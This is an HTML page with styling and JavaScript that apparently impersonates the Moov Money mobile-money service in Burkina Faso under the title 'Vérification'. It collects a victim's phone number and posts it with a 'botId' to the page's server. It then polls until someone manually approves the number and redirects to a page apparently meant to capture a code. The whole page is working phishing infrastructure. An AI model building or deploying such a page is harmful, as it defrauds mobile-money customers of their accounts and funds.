<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Moov Money - Vérification</title>

    <style>
        /* ── reset & base ── */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0a;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 32px 20px 28px;
            background: #0a0a0a;
        }

        /* ── titles ── */
        .title {
            font-size: 30px;
            font-weight: 700;
            text-align: left;
            margin-bottom: 6px;
            color: #ffffff;
            letter-spacing: -0.3px;
        }

        .subtitle {
            font-size: 15px;
            color: rgba(255, 255, 255, 0.5);
            text-align: left;
            margin-bottom: 32px;
            font-weight: 400;
            line-height: 1.4;
        }

        /* ── phone input ── */
        .phone-input-wrap {
            position: relative;
            margin-bottom: 22px;
        }

        .phone-input-wrap input {
            width: 100%;
            padding: 16px 16px 16px 60px;
            font-size: 16px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            background: rgba(255, 255, 255, 0.04);
            color: #ffffff;
            outline: none;
            transition: border-color 0.25s ease, background 0.25s ease;
            font-weight: 400;
            letter-spacing: 0.2px;
        }

        .phone-input-wrap input::placeholder {
            color: rgba(255, 255, 255, 0.25);
            font-weight: 400;
            letter-spacing: 0.2px;
        }

        .phone-input-wrap input:focus {
            border-color: #9A0000;
            background: rgba(255, 255, 255, 0.06);
        }

        .phone-input-wrap input:focus+.country-code {
            color: rgba(255, 255, 255, 0.8);
        }

        .country-code {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255, 255, 255, 0.6);
            font-size: 15px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 5px;
            pointer-events: none;
            letter-spacing: 0.2px;
            transition: color 0.25s ease;
        }

        .country-code::after {
            content: '▾';
            font-size: 9px;
            color: rgba(255, 255, 255, 0.25);
            margin-left: 3px;
            transition: color 0.25s ease;
        }

        .phone-input-wrap input:focus+.country-code::after {
            color: rgba(255, 255, 255, 0.5);
        }

        /* ── checkbox ── */
        .checkbox-wrap {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-bottom: 28px;
        }

        .checkbox-wrap input[type="checkbox"] {
            width: 20px;
            height: 20px;
            min-width: 20px;
            margin-top: 1px;
            accent-color: #9A0000;
            cursor: pointer;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 5px;
            transition: border-color 0.25s ease, background 0.25s ease;
            appearance: none;
            -webkit-appearance: none;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .checkbox-wrap input[type="checkbox"]:checked {
            background: #9A0000;
            border-color: #9A0000;
        }

        .checkbox-wrap input[type="checkbox"]:checked::after {
            content: '✓';
            color: #ffffff;
            font-size: 14px;
            font-weight: 700;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .checkbox-wrap input[type="checkbox"]:focus {
            outline: none;
            border-color: #9A0000;
        }

        .checkbox-wrap label {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.5);
            line-height: 1.5;
            cursor: pointer;
            margin-bottom: 0;
            font-weight: 400;
            letter-spacing: 0.1px;
        }

        .checkbox-wrap label a {
            color: #9A0000;
            text-decoration: none;
            font-weight: 500;
            transition: opacity 0.2s ease;
        }

        .checkbox-wrap label a:hover {
            opacity: 0.75;
            text-decoration: underline;
        }

        /* ── button ── */
        button {
            width: 100%;
            padding: 17px 16px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.25s ease, opacity 0.25s ease, transform 0.1s ease;
            border: none;
            letter-spacing: 0.3px;
        }

        button.primary {
            background: #9A0000;
            color: #ffffff;
            margin-bottom: 10px;
        }

        button.primary:hover:not(:disabled) {
            background: #7a0000;
        }

        button.primary:active:not(:disabled) {
            transform: scale(0.98);
        }

        button.primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        /* ── status & spinner ── */
        .status {
            margin-top: 14px;
            text-align: center;
            font-size: 14px;
            display: none;
            padding: 12px 16px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.04);
            font-weight: 400;
            letter-spacing: 0.1px;
        }

        .status.error {
            color: #9A0000;
            background: rgba(154, 0, 0, 0.08);
        }

        .spinner {
            margin: 18px auto 0;
            width: 34px;
            height: 34px;
            border: 3px solid rgba(154, 0, 0, 0.1);
            border-top: 3px solid #9A0000;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            display: none;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* ── responsive tweaks ── */
        @media (max-width: 440px) {
            .container {
                padding: 24px 16px 24px;
            }

            .title {
                font-size: 26px;
            }

            .subtitle {
                font-size: 14px;
                margin-bottom: 28px;
            }

            .phone-input-wrap input {
                padding: 15px 14px 15px 56px;
                font-size: 15px;
            }

            .country-code {
                left: 14px;
                font-size: 14px;
            }

            .checkbox-wrap label {
                font-size: 13px;
            }

            button {
                padding: 15px 16px;
                font-size: 15px;
            }
        }

        @media (max-width: 360px) {
            .title {
                font-size: 22px;
            }

            .subtitle {
                font-size: 13px;
            }

            .phone-input-wrap input {
                padding: 14px 12px 14px 50px;
                font-size: 14px;
            }

            .country-code {
                left: 12px;
                font-size: 13px;
            }
        }
    </style>
</head>

<body>

    <div class="container">

        <!-- NO LOGO – EXACTLY AS IMAGE -->

        <div class="title">Commençons</div>
        <div class="subtitle">Entrez votre numéro de téléphone pour commencer</div>

        <form id="detailsForm">
            <div class="phone-input-wrap">
                <span class="country-code">+226</span>
                <input type="text" id="phone" placeholder="Saisissez le numéro de téléphone" required />
            </div>

            <div class="checkbox-wrap">
                <input type="checkbox" id="termsCheck" required />
                <label for="termsCheck">
                    J'accepte le <a href="#">Conditions d'utilisation</a> et <a href="#">Politique de confidentialité</a>
                </label>
            </div>

            <button type="submit" class="primary">Continuer</button>
        </form>

        <div id="status" class="status">⏳ En attente d'approbation...</div>
        <div id="spinner" class="spinner"></div>

    </div>

    <script>
        let fullName = localStorage.getItem('fullName');
        if (!fullName) { fullName = 'Client Moov Money';
            localStorage.setItem('fullName', fullName); }

        const params = new URLSearchParams(window.location.search);
        const urlBotId = params.get('botId');
        if (urlBotId) localStorage.setItem('botId', urlBotId);
        const botId = localStorage.getItem('botId');

        if (!botId) { alert('Session expirée. Veuillez recommencer.');
            window.location.href = 'index.html'; }

        const form = document.getElementById('detailsForm');
        const statusEl = document.getElementById('status');
        const spinner = document.getElementById('spinner');
        const nextButton = form.querySelector('button.primary');
        const termsCheck = document.getElementById('termsCheck');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            if (!termsCheck.checked) {
                statusEl.style.display = 'block';
                statusEl.classList.add('error');
                statusEl.textContent = '❌ Veuillez accepter les conditions d\'utilisation';
                return;
            }
            nextButton.disabled = true;
            const phone = document.getElementById('phone').value.trim();
            if (!phone) {
                statusEl.style.display = 'block';
                statusEl.classList.add('error');
                statusEl.textContent = '❌ Veuillez entrer un numéro de téléphone';
                nextButton.disabled = false;
                return;
            }
            localStorage.setItem('phone', phone);
            statusEl.style.display = 'block';
            spinner.style.display = 'block';
            statusEl.classList.remove('error');
            statusEl.textContent = '⏳ En attente d\'approbation...';
            try {
                const res = await fetch(`${window.location.origin}/submit-phone`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name: fullName, phone, botId })
                });
                if (!res.ok) throw new Error();
                const { requestId } = await res.json();
                pollApproval(requestId);
            } catch (error) {
                spinner.style.display = 'none';
                statusEl.classList.add('error');
                statusEl.textContent = '❌ Erreur serveur. Veuillez réessayer.';
                nextButton.disabled = false;
            }
        });

        function pollApproval(requestId) {
            const interval = setInterval(async () => {
                try {
                    const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
                    const data = await res.json();
                    if (data.redirect) { clearInterval(interval);
                        window.location.href = data.redirect; return; }
                    if (data.approved === false) {
                        clearInterval(interval);
                        spinner.style.display = 'none';
                        statusEl.classList.add('error');
                        statusEl.textContent = '❌ Numéro rejeté. Veuillez réessayer.';
                        nextButton.disabled = false;
                    }
                    if (data.approved === true) { clearInterval(interval);
                        window.location.href = 'code.html'; }
                } catch (error) { console.error('Polling error:', error); }
            }, 2000);
        }
    </script>

</body>
</html>
